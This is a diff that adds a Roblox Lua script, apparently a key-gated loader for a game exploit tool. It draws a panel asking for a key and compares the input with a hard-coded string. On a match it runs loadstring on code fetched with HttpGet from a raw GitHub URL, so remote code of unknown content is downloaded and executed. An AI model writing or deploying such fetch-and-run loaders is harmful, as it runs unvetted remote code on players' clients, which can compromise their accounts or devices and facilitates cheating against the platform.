@@ -1,0 +1,35 @@
+local gui = Instance.new("ScreenGui")
+gui.Parent = game.Players.LocalPlayer.PlayerGui
+
+gui.Enabled = true
+gui.DisplayOrder = 999
+gui.ResetOnSpawn = false
+
+local frame = Instance.new("Frame")
+frame.Parent = gui
+frame.Size = UDim2.new(0, 200, 0, 150)
+frame.Position = UDim2.new(0, 10, 0.5, 0)
+frame.BackgroundColor3 = Color3.new(0, 0, 0)
+frame.BackgroundTransparency = 0.5
+
+local textBox = Instance.new("TextBox")
+textBox.Parent = frame
+textBox.Size = UDim2.new(0.8, 0, 0.2, 0)
+textBox.Position = UDim2.new(0.1, 0, 0.1, 0)
+textBox.Text = ""
+textBox.PlaceholderText = "Key"
+textBox.ClearTextOnFocus = false
+
+local enterButton = Instance.new("TextButton")
+enterButton.Parent = frame
+enterButton.Size = UDim2.new(0.6, 0, 0.2, 0)
+enterButton.Position = UDim2.new(0.2, 0, 0.6, 0)
+enterButton.Text = "Enter Key"
+enterButton.MouseButton1Click:Connect(function()
+    local enteredKey = textBox.Text
+    if enteredKey == "3lUoVRxo6v8HaZgPk661w4J2Eb2NY9" then
+        gui.Enabled = false
+        wait(2)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/qwdawsdgrwaW/31arcun3156/main/script/systeam"))()
+    end
+end)
